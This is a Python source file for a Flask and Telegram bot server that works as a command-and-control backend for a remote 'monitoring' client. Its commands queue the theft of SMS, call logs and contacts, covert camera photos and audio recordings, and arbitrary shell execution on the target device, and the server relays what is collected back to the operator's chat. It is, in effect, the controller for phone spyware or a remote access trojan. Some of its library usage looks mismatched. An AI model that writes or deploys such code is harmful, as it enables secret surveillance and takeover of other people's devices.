import os
import json
import logging
import threading
import time
import uuid
from flask import Flask, request, jsonify
from telegram import Bot, Update
from telegram.ext import Dispatcher, CommandHandler, MessageHandler, filters

# ---------- CONFIG ----------
BOT_TOKEN = os.environ.get('BOT_TOKEN')           # Your bot token
OWNER_CHAT_ID = os.environ.get('OWNER_CHAT_ID')   # Optional: restrict to a single user (int)
# ----------------------------

app = Flask(__name__)
bot = Bot(token=BOT_TOKEN)
dispatcher = Dispatcher(bot, None, use_context=True)

# Simple in-memory storage (for demo). Use a DB for production.
clients = {}                # client_id -> {'owner_chat_id': int, 'commands': []}
owner_to_client = {}        # owner_chat_id -> client_id

# ---------- BOT COMMAND HANDLERS ----------
async def start(update, context):
    await update.message.reply_text("Monitoring bot active. Send /help for commands.")

async def help_command(update, context):
    text = """
Available commands:
/sms          - Get recent SMS
/call         - Get call logs
/contact      - Get contacts
/photo        - Capture photo from camera
/record       - Record 15 sec audio
/live         - Enable live notifications (basic polling)
/cmd <shell>  - Execute a shell command
/register <client_id> - Register a client with this chat
    """
    await update.message.reply_text(text)

async def register(update, context):
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /register <client_id>")
        return
    client_id = context.args[0]
    owner = update.effective_chat.id
    if OWNER_CHAT_ID and owner != int(OWNER_CHAT_ID):
        await update.message.reply_text("Unauthorized.")
        return
    clients.setdefault(client_id, {'owner_chat_id': owner, 'commands': []})
    clients[client_id]['owner_chat_id'] = owner
    owner_to_client[owner] = client_id
    await update.message.reply_text(f"Client {client_id} registered.")

async def generic_command(update, context):
    """Handle /sms, /call, /contact, /photo, /record, /live"""
    cmd = update.message.text.strip().lower()[1:]  # remove '/'
    owner = update.effective_chat.id
    if OWNER_CHAT_ID and owner != int(OWNER_CHAT_ID):
        await update.message.reply_text("Unauthorized.")
        return
    client_id = owner_to_client.get(owner)
    if not client_id:
        await update.message.reply_text("No client registered. Use /register first.")
        return
    # Queue command
    clients[client_id]['commands'].append({
        'action': cmd,
        'args': {},
        'timestamp': time.time()
    })
    await update.message.reply_text(f"Command '{cmd}' queued for client {client_id}.")

async def cmd_command(update, context):
    """Handle /cmd <shell command>"""
    if not context.args:
        await update.message.reply_text("Usage: /cmd <shell command>")
        return
    owner = update.effective_chat.id
    if OWNER_CHAT_ID and owner != int(OWNER_CHAT_ID):
        await update.message.reply_text("Unauthorized.")
        return
    client_id = owner_to_client.get(owner)
    if not client_id:
        await update.message.reply_text("No client registered.")
        return
    command = ' '.join(context.args)
    clients[client_id]['commands'].append({
        'action': 'cmd',
        'args': {'command': command},
        'timestamp': time.time()
    })
    await update.message.reply_text("Shell command queued.")

# Add handlers to dispatcher
dispatcher.add_handler(CommandHandler("start", start))
dispatcher.add_handler(CommandHandler("help", help_command))
dispatcher.add_handler(CommandHandler("register", register))
dispatcher.add_handler(CommandHandler(["sms", "call", "contact", "photo", "record", "live"], generic_command))
dispatcher.add_handler(CommandHandler("cmd", cmd_command))

# ---------- FLASK ENDPOINTS ----------
@app.route('/webhook', methods=['POST'])
def webhook():
    """Telegram webhook endpoint."""
    update = Update.de_json(request.get_json(force=True), bot)
    threading.Thread(target=dispatcher.process_update, args=(update,)).start()
    return 'ok'

@app.route('/poll/<client_id>', methods=['GET'])
def poll(client_id):
    """Client polls for commands."""
    if client_id not in clients:
        return jsonify({'error': 'Client not registered'}), 404
    cmds = clients[client_id]['commands']
    if cmds:
        return jsonify(cmds.pop(0))
    return jsonify({'action': 'none'})

@app.route('/result/<client_id>', methods=['POST'])
def result(client_id):
    """Client posts result of command execution."""
    if client_id not in clients:
        return jsonify({'error': 'Client not registered'}), 404
    owner = clients[client_id]['owner_chat_id']

    if 'file' in request.files:
        # File upload
        file = request.files['file']
        caption = request.form.get('caption', '')
        fname = file.filename.lower()
        try:
            if fname.endswith(('.jpg', '.jpeg', '.png')):
                bot.send_photo(chat_id=owner, photo=file, caption=caption)
            elif fname.endswith(('.ogg', '.mp3', '.m4a', '.wav')):
                bot.send_audio(chat_id=owner, audio=file, caption=caption)
            else:
                bot.send_document(chat_id=owner, document=file, caption=caption)
        except Exception as e:
            bot.send_message(chat_id=owner, text=f"Error sending file: {e}")
        return jsonify({'status': 'file processed'})
    else:
        # Text result
        data = request.get_json()
        text = data.get('text', '')
        bot.send_message(chat_id=owner, text=text)
        return jsonify({'status': 'message sent'})

@app.route('/')
def index():
    return "Bot server is running."

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)